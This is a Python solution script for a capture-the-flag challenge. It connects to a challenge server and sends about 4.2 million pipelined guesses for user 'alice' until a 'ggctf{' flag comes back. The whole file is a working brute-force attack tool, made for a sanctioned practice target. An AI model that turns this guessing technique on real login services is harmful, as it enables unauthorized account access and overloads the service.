import socket
import threading
import os
import time

def reader(s):
    buffer = ""
    while True:
        try:
            data = s.recv(8192).decode('utf-8', errors='ignore')
            if not data:
                break
            buffer += data
            
            # Check for the flag!
            if 'Flag:' in buffer or 'ggctf{' in buffer:
                print("\n" + "="*50)
                print("[+] FOUND THE FLAG!!!")
                
                # Extract and print the flag cleanly
                if 'Flag:' in buffer:
                    idx = buffer.find('Flag:')
                    print(buffer[idx:idx+200].split('\n')[0].strip())
                elif 'ggctf{' in buffer:
                    idx = buffer.find('ggctf{')
                    print(buffer[idx:idx+200].split('}')[0] + '}')
                
                print("="*50)
                os._exit(0)
                
            # Keep buffer small to save memory
            if len(buffer) > 20000:
                buffer = buffer[-10000:]
        except Exception as e:
            print(f"Reader error: {e}")
            break

print("[*] Connecting to server...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('0.cloud.chals.io', 32216))

# Start the background reader thread
t = threading.Thread(target=reader, args=(s,))
t.daemon = True
t.start()

print("[*] Connected! Starting pipelined brute-force...")
print("[*] Blasting 4.2 million guesses... (this might take 1-3 minutes)")

chunk = ""
# 2^22 = 4,194,304
max_guess = 4194304

start_time = time.time()
for i in range(max_guess):
    # The magic payload that works in both menus
    chunk += f"1\nalice\n{i}\n"
    
    # Send in chunks of 50,000 to keep network pipeline saturated but stable
    if i % 50000 == 0 and i > 0:
        s.sendall(chunk.encode())
        chunk = ""
        elapsed = time.time() - start_time
        rate = i / elapsed if elapsed > 0 else 0
        print(f"[*] Sent {i}/{max_guess} guesses ({rate:.0f} guesses/sec)...")

# Send any remaining guesses
if chunk:
    s.sendall(chunk.encode())

print("[*] All guesses sent! Waiting for server to process them...")
t.join(timeout=30)
